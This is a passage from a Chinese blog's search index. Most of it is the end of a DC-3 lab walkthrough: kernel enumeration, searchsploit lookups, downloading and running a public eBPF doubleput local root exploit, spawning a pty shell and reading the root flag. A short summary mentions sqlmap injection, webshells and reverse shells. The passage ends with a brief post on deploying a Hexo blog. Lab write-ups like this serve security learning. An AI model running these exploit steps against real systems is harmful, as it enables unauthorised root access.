src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005240879.png" alt="image-20240704005240879"></p><p>可执行的命令和能够提权的命令之间似乎没用交集，也就是已知的可使用的命令都不能够用来提权。</p><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p>通过以下指令查询使用的操作系统信息以及内核相关信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a  // 显示系统信息 -a表示可用信息<br><span class="hljs-built_in">cat</span> /etc/issue   //查看系统的简要说明或欢迎信息<br><span class="hljs-built_in">cat</span> /etc/*-release  //查看系统的发行版本信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005611511.png" alt="image-20240704005611511"></p><p>可以得到的信息是：</p><blockquote><p>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</p><p>Ubuntu 16.04 LTS（VERSION&#x3D;”16.04 LTS (Xenial Xerus)”）</p></blockquote><p>通过searchsploit查找可利用的漏洞代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704010041749.png" alt="image-20240704010041749"></p><p>搜索结果不少，一般来说，文件后缀名为<code>txt</code>的漏洞利用比较容易实现。可以对搜索得到的漏洞进行逐一尝试（一共有六个）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 40937.txt<br>searchsploit -p 40943.txt<br>searchsploit -p 41923.txt<br>searchsploit -p 39773.txt<br>searchsploit -p 39772.txt<br>searchsploit -p 40489.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110327425.png" alt="image-20240704110327425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110814118.png" alt="image-20240704110814118"></p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40937.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40943.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41923.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;dos&#x2F;39773.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40489.txt</p><p>没有什么有用的提示</p><p>给出了两个利用文件以及文件下载地址</p><p>给出了漏洞概述以及漏洞代码，似乎没有利用方法</p><p>没有什么有用的提示</p><p>给出了漏洞文件的下载地址以及使用方法（√）</p><p>给出了提权方法，但是是利用ipv6的兼容端口复用的，利用方法没给</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114451762.png" alt="image-20240704114451762"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">（进入到对应目录）<br>./compile.sh<br>./doubleput<br>（等待提权成功）<br><span class="hljs-built_in">id</span>   // 验证当前用户身份，是否提权成功<br></code></pre></td></tr></table></figure><blockquote><p>Proof of Concept（概念验证）: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</a><br>Exploit-DB Mirror（下载镜像）: <a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a></p></blockquote><p>点击下载镜像之后，跳转到浏览器，自动下载成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114809119.png" alt="image-20240704114809119"></p><p>嗯！怎么可以在本物理机下载漏洞呢！得下在虚拟机啊！记住要以目标靶机合法用户的身份下载！因为后续要进行提权！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<br></code></pre></td></tr></table></figure><p>下载并保存成功了！保存文件名为“39772.zip”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121612377.png" alt="image-20240704121612377"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip 39772.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121708628.png" alt="image-20240704121708628"></p><p>创建了一个名为“39772”的文件夹，进入看看它有什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 39772<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121729949.png"></p><p>对这两个tar文件进行解压缩：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf crasher.tar<br>tar -xvf exploit.tar<br></code></pre></td></tr></table></figure><p>**<code>tar</code>**：是 Linux 和类 Unix 系统中用于处理归档文件的命令。</p><p>**<code>-x</code>**：表示执行解压缩操作（extract），即从归档文件中提取文件。</p><p>**<code>-v</code>**：可选参数，表示详细模式（verbose），在解压缩过程中显示详细信息。</p><p>**<code>-f</code>**：指定要操作的归档文件的名称。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123036561.png" alt="image-20240704123036561"></p><p>查看当前目录下的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123117671.png" alt="image-20240704123117671"></p><p>第二第三个文件的前缀是不是和前面获得的漏洞利用方法那儿一致呀！进入exploit利用文件（因为我们要利用漏洞嘛），然后执行提权命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123558257.png" alt="image-20240704123558257"></p><p>根据提示信息，我们现在已经获取了root权限！</p><p>开启交互界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>验证是否为root权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123736857.png" alt="image-20240704123736857"></p><p>接下来就是要找到那个唯一的flag文件了，启用find命令查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124000907.png" alt="image-20240704124000907"></p><p>cat一下看看啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/the-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124054377.png" alt="image-20240704124054377"></p><p>至此，所有工作完成！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>sqlmap注入、john碰撞爆破hash、一句话木马注入、通过prop_open反弹shell</p><ul><li><p>拿站后进行提权的方式多样，其中包括</p><ul><li>可执行的二进制文件具有suid权限，特别是相关命令的提权</li><li>内核漏洞脏牛提权</li><li>密码复用提权</li><li>明文root密码提权</li><li>第三方服务提权</li></ul></li><li><p>sqlmap的使用方法多样，通过多种使用方法可以实现不同的效果</p></li><li><p>拿到网站后台管理系统后，可以寻找发布网页或者网页本身内容的php文件，通过插入一句话木马或者反弹shell实现getshell</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>有关部署GitHub博客的坑</title>
    <link href="/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/"/>
    <url>/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<blockquote><p>也就是说，如果想创建一个新的博客。执行步骤是：</p><ul><li>新建一个空文件夹</li><li>终端进入该文件夹中，hexo init</li><li>需要下载git，npm install hexo-deployer-git -save</li><li>然后修改博客目录下的 _config.yml 文件，修改语言（注意，名字需要先到主题文件夹下的language上查看，不要拼写错名字了）</li><li>添加deploy配置，type（git），repo（仓库的ssh链接），branch（main）</li><li>hexo g</li><li>hexo d</li><li>hexo s查看效果</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
